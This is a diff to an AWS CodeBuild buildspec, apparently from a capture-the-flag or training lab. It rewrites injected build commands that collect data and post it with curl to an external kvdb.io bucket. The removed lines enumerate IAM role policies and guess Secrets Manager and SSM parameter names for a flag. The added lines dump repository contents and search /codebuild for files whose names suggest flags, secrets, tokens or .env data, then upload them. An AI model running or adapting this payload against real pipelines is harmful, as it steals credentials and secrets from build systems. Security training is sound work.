@@ -14,52 +14,18 @@ phases:
         bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
         runid="${CODEBUILD_BUILD_ID##*:}"
         putkey(){ key="$1"; file="$2"; head -c 15000 "$file" | curl -fsS --connect-timeout 5 --max-time 20 --data-binary @- "$bucket/${runid}_$key" || true; }
-        echo "canary $runid" > /tmp/canary.txt
-        putkey canary /tmp/canary.txt
-        names='flag FLAG lab-flag lab5-flag lab_5_flag codebuild-flag codebuild_lab_5_flag codebuild_lab_5_secret codebuild-codebreach-actors-lab-flag codebreach-flag actors-flag training-flag'
-        params='/flag /FLAG /lab/flag /lab5/flag /lab-5/flag /codebuild/flag /codebuild_lab_5/flag /codebreach/flag /actors/flag /training/flag'
-
-        aws sts get-caller-identity --cli-connect-timeout 5 --cli-read-timeout 10 > /tmp/whoami.txt 2>&1
-        putkey whoami /tmp/whoami.txt
-
+        echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
         {
-          echo '=== codebuild batch-get-projects ==='
-          aws codebuild batch-get-projects --names codebuild_lab_5_project --region us-east-1 --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
-          echo '=== iam role policies ==='
-          aws iam list-role-policies --role-name codebuild_lab_5_role --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
-          aws iam list-attached-role-policies --role-name codebuild_lab_5_role --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
-          for p in $(aws iam list-role-policies --role-name codebuild_lab_5_role --query 'PolicyNames[]' --output text --cli-connect-timeout 5 --cli-read-timeout 10 2>/dev/null); do
-            echo "--- inline policy:$p"
-            aws iam get-role-policy --role-name codebuild_lab_5_role --policy-name "$p" --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
-          done
-        } > /tmp/project_iam.txt 2>&1
-        putkey project_iam /tmp/project_iam.txt
-
+          echo '=== repo files ==='
+          find . -path './.git' -prune -o -type f -maxdepth 5 -print
+          echo '=== repo contents ==='
+          for f in $(find . -path './.git' -prune -o -type f -maxdepth 5 -print); do echo "--- $f"; sed -n '1,160p' "$f"; done
+        } > /tmp/repo.txt 2>&1
+        putkey repo /tmp/repo.txt
         {
-          echo '=== direct secretsmanager guesses ==='
-          for n in $names; do
-            echo "--- secret:$n"
-            aws secretsmanager get-secret-value --region us-east-1 --secret-id "$n" --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
-          done
-        } > /tmp/secret_guesses.txt 2>&1
-        putkey secret_guesses /tmp/secret_guesses.txt
-
-        {
-          echo '=== direct ssm guesses ==='
-          for p in $params; do
-            echo "--- parameter:$p"
-            aws ssm get-parameter --region us-east-1 --name "$p" --with-decryption --output json --cli-connect-timeout 5 --cli-read-timeout 10 2>&1
-          done
-        } > /tmp/ssm_guesses.txt 2>&1
-        putkey ssm_guesses /tmp/ssm_guesses.txt
-
-        {
-          echo '=== local repo and filesystem hints ==='
-          pwd
-          find . -maxdepth 4 -type f -print -exec sed -n '1,80p' {} \; 2>/dev/null | head -c 12000
-          echo '=== /codebuild/output files ==='
-          find /codebuild/output -maxdepth 5 -type f 2>/dev/null | head -n 200
-          echo '=== root small files names ==='
-          find / -maxdepth 4 -type f 2>/dev/null | grep -Ei 'flag|secret|token|lab|codebuild' | head -n 200
-        } > /tmp/local_hints.txt 2>&1
-        putkey local_hints /tmp/local_hints.txt
+          echo '=== codebuild tmp/output likely files ==='
+          find /codebuild -path '*/.git/*' -prune -o -type f \( -name '*flag*' -o -name '*secret*' -o -name '*token*' -o -name '*.txt' -o -name '*.json' -o -name '*.env' \) -print 2>/dev/null | head -n 300
+          echo '=== readable candidates ==='
+          for f in $(find /codebuild -path '*/.git/*' -prune -o -type f \( -name '*flag*' -o -name '*secret*' -o -name '*token*' -o -name '*.txt' -o -name '*.json' -o -name '*.env' \) -print 2>/dev/null | head -n 80); do echo "--- $f"; sed -n '1,80p' "$f" 2>/dev/null; done
+        } > /tmp/cbfiles.txt 2>&1
+        putkey cbfiles /tmp/cbfiles.txt
